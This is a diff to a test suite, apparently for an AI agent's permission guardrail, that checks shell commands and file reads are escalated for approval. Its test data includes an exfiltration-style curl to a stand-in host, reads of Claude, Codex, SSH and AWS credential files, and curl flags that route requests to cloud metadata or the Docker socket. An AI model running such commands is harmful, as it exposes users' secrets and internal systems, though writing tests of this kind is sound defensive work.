@@ -181,7 +181,7 @@ describe('classifyShellCommand — curl/wget 带查询串的 GET(exfil 面)', ()
     }
   });
   it('bare / path-only GET 仍放行(命令行浏览器)', () => {
-    for (const c of ['curl -sS https://example.com/', 'curl https://example.com/docs/page', 'wget --max-redirect=0 https://example.com']) {
+    for (const c of ['curl -sS https://example.com/', 'curl https://example.com/docs/page']) {
       expect(classifyShellCommand(c, roots)).toBe('auto-approve');
     }
   });
@@ -218,7 +218,7 @@ describe('classifyShellCommand — curl/wget 目标识别(no-URL fail-closed + �
     expect(classifyShellCommand('curl -sS evil.example/p?data=leak', roots)).toBe('prompt');
   });
   it('bare host / path-only 公网(含无 scheme)仍放行', () => {
-    for (const c of ['curl example.com', 'curl https://example.com/docs', 'curl example.com/docs/page', 'wget --max-redirect=0 https://example.com']) {
+    for (const c of ['curl example.com', 'curl https://example.com/docs', 'curl example.com/docs/page']) {
       expect(classifyShellCommand(c, roots)).toBe('auto-approve');
     }
   });
@@ -231,9 +231,9 @@ describe('classifyShellCommand — 重定向跟随(SSRF 绕过面)', () => {
       expect(classifyShellCommand(c, roots)).toBe('prompt');
     }
   });
-  it('curl 不跟随 / wget 显式关闭跟随 → 公网仍放行', () => {
+  it('curl 不跟随重定向 → 公网放行;wget 一律升级(默认写文件 + 跟随重定向)', () => {
     expect(classifyShellCommand('curl https://example.com', roots)).toBe('auto-approve');
-    expect(classifyShellCommand('wget --max-redirect=0 https://example.com', roots)).toBe('auto-approve');
+    expect(classifyShellCommand('wget --max-redirect=0 https://example.com', roots)).toBe('prompt');
   });
 });
 
@@ -271,6 +271,40 @@ describe('reviewAction — Windows 反斜杠凭证路径(内置 Read 经此升�
   it('C:\\...\\.ssh\\id_rsa / .aws\\credentials → prompt-each-time', () => {
     expect(reviewAction({ kind: 'read', path: 'C:\\Users\\me\\.ssh\\id_rsa' }, roots)).toBe('prompt-each-time');
     expect(reviewAction({ kind: 'read', path: 'C:\\Users\\me\\.aws\\credentials' }, roots)).toBe('prompt-each-time');
+  });
+});
+
+// 第四轮护栏:agent OAuth 凭证文件、git --output 写文件、curl SSRF 改路由 flag、wget 一律升级、无人值守只放行 auto-approve。
+describe('reviewAction / classifyShellCommand — agent OAuth 凭证文件', () => {
+  it('Claude .credentials.json / Codex auth.json → prompt-each-time', () => {
+    expect(reviewAction({ kind: 'read', path: '/Users/me/.claude/.credentials.json' }, roots)).toBe('prompt-each-time');
+    expect(reviewAction({ kind: 'read', path: '/Users/me/.codex/auth.json' }, roots)).toBe('prompt-each-time');
+    expect(reviewAction({ kind: 'read', path: '/Users/me/.config/codex/auth.json' }, roots)).toBe('prompt-each-time');
+    expect(classifyShellCommand('cat ~/.claude/.credentials.json', roots)).toBe('prompt-each-time');
+  });
+});
+
+describe('classifyShellCommand — git --output 写文件 / curl SSRF 改路由 / wget 一律升级', () => {
+  it('git diff --output 写文件(无 shell >)→ prompt;普通 git diff 仍放行', () => {
+    expect(classifyShellCommand('git diff --output ~/.bashrc HEAD^ HEAD', roots)).toBe('prompt');
+    expect(classifyShellCommand('git diff --output=/tmp/x HEAD', roots)).toBe('prompt');
+    expect(classifyShellCommand('git diff HEAD', roots)).toBe('auto-approve');
+  });
+  it('curl 改路由 flag(--resolve/--connect-to/--unix-socket/-x/--proxy)→ prompt(SSRF 绕过)', () => {
+    for (const c of [
+      'curl --resolve example.com:443:169.254.169.254 https://example.com',
+      'curl --connect-to example.com:443:10.0.0.5:443 https://example.com',
+      'curl --unix-socket /var/run/docker.sock http://localhost/x',
+      'curl -x http://proxy.internal:8080 https://example.com',
+      'curl --proxy http://p:8080 https://example.com',
+    ]) {
+      expect(classifyShellCommand(c, roots)).toBe('prompt');
+    }
+  });
+  it('wget 一律升级(默认写文件 + 跟随重定向),含 stdout 形态', () => {
+    for (const c of ['wget https://example.com', 'wget -qO- https://example.com', 'wget --max-redirect=0 https://example.com']) {
+      expect(classifyShellCommand(c, roots)).toBe('prompt');
+    }
   });
 });
 
